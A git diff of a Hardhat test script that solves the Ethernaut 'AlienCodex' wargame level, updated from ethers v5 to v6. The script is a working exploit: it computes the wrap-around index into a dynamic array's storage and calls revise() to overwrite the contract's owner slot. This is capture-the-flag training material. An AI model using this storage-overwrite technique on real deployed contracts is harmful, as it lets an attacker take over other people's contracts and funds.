@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { BigNumber, Contract, Signer } from "ethers";
+import { Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
 
@@ -14,14 +14,14 @@ before(async () => {
   [eoa] = accounts;
   const challengeFactory = await ethers.getContractFactory(`AlienCodex`);
   const challengeAddress = await createChallenge(
-    `0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272`
+    `0x0BC04aa6aaC163A6B3667636D798FA053D43BD11`
   );
   challenge = await challengeFactory.attach(challengeAddress);
 });
 
 it("solves the challenge", async function () {
   // we need to make contract first to pass the modifier checks of other functions
-  tx = await challenge.make_contact();
+  tx = await challenge.makeContact();
   await tx.wait();
 
   // all of contract storage is a 32 bytes key to 32 bytes value mapping
@@ -41,23 +41,28 @@ it("solves the challenge", async function () {
   // codex[0] value is stored at keccak(codexSlot) = keccak(1)
   // codexSlot = 1 because slot 0 contains both 20 byte address (owner) & boolean
   // needs to be padded to a 256 bit
-  const codexBegin = BigNumber.from(
-    ethers.utils.keccak256(
+  const codexBegin = BigInt(
+    ethers.keccak256(
       `0x0000000000000000000000000000000000000000000000000000000000000001`
     )
   );
-  console.log(`codexBegin`, codexBegin.toHexString());
+  console.log(`codexBegin`, "0x" + codexBegin.toString(16));
   // need to find index at this location now that maps to 0 mod 2^256
   // i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
-  const ownerOffset = BigNumber.from(`2`).pow(`256`).sub(codexBegin);
-  console.log(`owner`, await eoa.provider!.getStorageAt(challenge.address, ownerOffset))
-  
+  // slot = codexBegin + i   (mod 2^256)
+  // codexBegin + i ≡ 0   (mod 2^256)
+  // i ≡ -codexBegin (mod 2^256)
+  // -codexBegin ≡ 2^256 - codexBegin
+  // i = 2^256 - codexBegin
+  const ownerOffset = (1n << 256n) - codexBegin;
+  console.log(`owner`, await eoa.provider!.getStorage(challenge.target, 0))
+
   const eoaAddress = await eoa.getAddress()
-  tx = await challenge.revise(ownerOffset, ethers.utils.zeroPad(eoaAddress, 32));
+  tx = await challenge.revise(ownerOffset, ethers.zeroPadValue(eoaAddress, 32));
   await tx.wait();
-  console.log(`owner`, await eoa.provider!.getStorageAt(challenge.address, ownerOffset))
+  console.log(`owner`, await eoa.provider!.getStorage(challenge.target, 0))
 });
 
 after(async () => {
-  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  expect(await submitLevel(challenge.target as string), "level not solved").to.be.true;
 });
